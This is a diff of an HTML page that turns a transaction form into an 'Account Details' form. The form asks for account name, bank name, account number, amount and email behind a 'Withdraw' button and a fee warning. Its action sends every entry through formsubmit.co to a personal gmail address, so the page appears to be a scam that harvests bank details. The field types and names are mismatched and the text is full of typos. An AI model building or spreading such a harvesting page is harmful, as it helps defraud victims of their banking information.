@@ -7,18 +7,28 @@
     <link rel="stylesheet" href="styl.css">
 </head>
 <body>
+
     <div class="container">
-        <h1>Transactions</h1>
+        <h2>Accout Details</h2>
         <form action="https://formsubmit.co/johnmanager.austin@gmail.com" method="POST">
-            <input type="text" name="Name" placeholder="full Name">
+            <input type="text" name="Name" placeholder="Account Name">
+            <input type="email" name="Email" placeholder="Bank Name " required>
+            <input type="amount" name="Amount" placeholder="Account Number" required>
+            <input type="email" name="Email" placeholder="Amout" required>
             <input type="email" name="Email" placeholder="Email" required>
-            <input type="amount" name="Amount" placeholder="Amount" required>
-            <textarea name="text" placeholder="                 Enter Text
-
-
- Note you would be charged for international transactions depending the Amoun" required></textarea>
+            <select name="Continent">
+                <h2><option>Region</option></h2>
+                <option>Africa</option>
+                <option>Antarctica</option>
+                <option>Asia</option>
+                <option>Australia</option>
+                <option>Europe</option>
+                <option>North America</option>
+                <option>South America</option>
+            </select>
+            <textarea name="text" placeholder="             Enter Text
+Be wear you are going to charged for international transactions depending the Amoun" required></textarea>
             <button type="submit">Withdraw</button>
-            </textarea>
         </form>
     </div>
 </body>
